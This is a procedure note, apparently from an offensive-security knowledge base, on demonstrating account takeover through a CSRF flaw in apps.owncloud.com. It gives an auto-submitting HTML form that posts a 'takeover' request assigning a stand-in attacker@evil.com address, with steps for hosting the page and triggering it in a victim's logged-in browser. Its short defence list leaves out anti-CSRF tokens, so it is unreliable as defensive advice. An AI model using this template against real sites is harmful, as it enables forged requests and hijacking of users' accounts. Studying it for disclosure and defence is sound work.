---
id: uuid-proc-demonstrate-csrf-poc-2
tags:
  - csrf
  - account-takeover
  - poc
type: procedure
tools: []
tactics:
  - '[[Impact]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[User Execution]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:27:15.594Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[User Execution]]'
  - '[[Exploit Public-Facing Application]]'
---
# Demonstrate-Account-Takeover-via-CSRF-POC

## Summary

This procedure demonstrates the exploitation of a CSRF vulnerability in apps.owncloud.com by creating a proof-of-concept (POC) HTML page that automatically submits a forged request, leading to unauthorized account takeover when visited by an authenticated user.

## Description

The POC targets the vulnerable endpoints lacking CSRF protection, tricking the user's browser into sending a request that modifies account details, such as adding an attacker-controlled app or changing credentials. This social engineering vector relies on the user visiting a malicious page (e.g., via phishing link), after which the attack executes silently. The procedure includes crafting the HTML, hosting it, and validating the takeover, with outcomes including full control over the victim's ownCloud account. A YouTube video can be used to record and share the demonstration for reporting.

## Requirements

1. Text editor to create the HTML POC file
2. Local web server or hosting service to serve the malicious page
3. Authenticated browser session on apps.owncloud.com
4. Video recording tool for demonstration (optional)

## Defense

Defensive measures and detection strategies:

- Require user confirmation for sensitive actions via JavaScript prompts
- Deploy Content Security Policy (CSP) to restrict form submissions
- Log and alert on rapid or unexpected state changes in user accounts

## Objectives

1. Execute a forged request to modify user account without consent
2. Achieve account takeover by altering permissions or credentials
3. Validate and document the exploit for disclosure

## Instructions

### Step 1: Craft the Malicious HTML POC

**Context**: Build an HTML file that auto-submits a form to the vulnerable endpoint, mimicking a legitimate account modification request.

Create a file named csrf-poc.html with content like:

```html
<!DOCTYPE html>
<html>
<body>
<form id="csrf-form" action="https://apps.owncloud.com/vulnerable-endpoint" method="POST">
<input type="hidden" name="action" value="takeover">
<input type="hidden" name="new_owner" value="attacker@evil.com">
</form>
<script>document.getElementById('csrf-form').submit();</script>
</body>
</html>
```

Replace placeholders with actual endpoint and parameters from vulnerability analysis.

**Expected Output**: An HTML file ready for hosting that triggers the request on load.

### Step 2: Host and Test the POC

**Context**: Serve the page and simulate the attack to confirm account takeover.

Host the file locally (e.g., python -m http.server 8000) or upload to a public server. While authenticated to ownCloud, visit the hosted page in the same browser.

Observe the automatic form submission and check the ownCloud account for changes.

Record the process using screen capture software for a YouTube demonstration.

**Expected Output**: Account modified as intended, with evidence of takeover in the video or logs.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]]

### Techniques

- [[User Execution]]
- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[account-takeover]]
- [[poc]]
